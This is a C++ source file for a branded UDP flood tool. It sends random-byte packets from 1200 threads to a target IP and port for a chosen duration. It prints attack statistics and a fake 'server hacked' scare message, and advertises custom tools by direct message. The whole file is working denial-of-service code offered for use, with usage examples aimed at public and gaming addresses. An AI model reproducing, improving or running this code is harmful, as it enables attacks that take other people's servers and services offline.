
#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define THREAD_COUNT 1200
#define MAX_PACKETS_ALLOWED 20000000

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define CYAN    "\033[1;36m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"
#define MAGENTA "\033[1;35m"

bool keepSending = true;
uint64_t totalPacketsSent = 0;
uint64_t totalDataSent = 0;
std::mutex statsMutex;

void signalHandler(int signum) {
    keepSending = false;
}

void showBanner() {
    std::cout << MAGENTA << R"(
╔═══════════════════════════════════════════════════════╗
║      WELCOME TO ROHAN & SADIQ ADVANCED UDP TOOL      ║
║         Engineered by: @Rohan2349 & @Sadiq9869       ║
╚═══════════════════════════════════════════════════════╝
)" << RESET;
}

void sendFlood(const char* ip, int port, int duration, int packetSize, int threadId) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (udpSocket < 0) return;

    struct sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    char* packet = new char[packetSize];
    for (int i = 0; i < packetSize; ++i)
        packet[i] = rand() % 256;

    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(duration);

    if (threadId == 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(677));
        std::cout << RED << "[TRAP WARNING] YOUR SERVER HAS BEEN HACKED! TYPE 'okay' OR 'no'" << RESET << std::endl;
    }

    while (keepSending && std::chrono::steady_clock::now() < endTime) {
        bool underLimit = false;
        {
            std::lock_guard<std::mutex> lock(statsMutex);
            if (totalPacketsSent < MAX_PACKETS_ALLOWED) {
                underLimit = true;
                totalPacketsSent++;
                totalDataSent += packetSize;
            }
        }

        sendto(udpSocket, packet, packetSize, 0, (struct sockaddr*)&target, sizeof(target));

        if (!underLimit && std::chrono::steady_clock::now() >= endTime) break;
    }

    close(udpSocket);
    delete[] packet;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cout << RED << "\nInvalid usage!\n" << RESET;
        std::cout << CYAN << "Usage:\n  " << argv[0] << " <IP> <Port> <Duration> <PacketSize>\n" << RESET;
        std::cout << GREEN << "\nExamples:\n"
                  << "  " << argv[0] << " 1.1.1.1 3074 60 1367\n"
                  << "  " << argv[0] << " 192.168.0.1 80 120 1024\n"
                  << RESET;
        std::cout << MAGENTA << "\nNeed help? Contact @Rohan2349 or @Sadiq9869\n" << RESET;
        return 1;
    }

    const char* ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int packetSize = std::atoi(argv[4]);

    if (packetSize <= 0 || packetSize > 65507) {
        std::cout << RED << "Invalid packet size! Must be between 1 and 65507 bytes.\n" << RESET;
        return 1;
    }

    signal(SIGINT, signalHandler);
    showBanner();

    std::cout << CYAN "━━━━━━━━━━━━━━━━━━━" RESET << std::endl;
    std::cout << GREEN " Target      " RESET << " : " << ip << ":" << port << std::endl;
    std::cout << GREEN " Method      " RESET << " : UDP-FLOOD\n";
    std::cout << GREEN " Threads     " RESET << " : " << THREAD_COUNT << std::endl;
    std::cout << GREEN " Packet Size " RESET << " : " << packetSize << " bytes\n";
    std::cout << GREEN " Max Packets " RESET << " : " << MAX_PACKETS_ALLOWED << std::endl;
    std::cout << GREEN " Duration    " RESET << " : " << duration << " sec\n";
    std::cout << CYAN "━━━━━━━━━━━━━━━━━━━" RESET << std::endl;
    std::cout << "Flood started... Press CTRL+C to stop\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(sendFlood, ip, port, duration, packetSize, i);
    }

    for (auto& t : threads) t.join();

    std::cout << "\n" GREEN "========== ATTACK COMPLETE ==========" RESET << "\n";
    std::cout << CYAN << "[+] Packets Sent : " << totalPacketsSent << "\n";
    std::cout << "[+] Data Sent    : " << std::fixed << std::setprecision(2)
              << (totalDataSent / (1024.0 * 1024.0)) << " MB\n";
    std::cout << MAGENTA << "\nPowered by @Rohan2349 & @Sadiq9869 - DM for custom tools\n" << RESET;

    return 0;
}
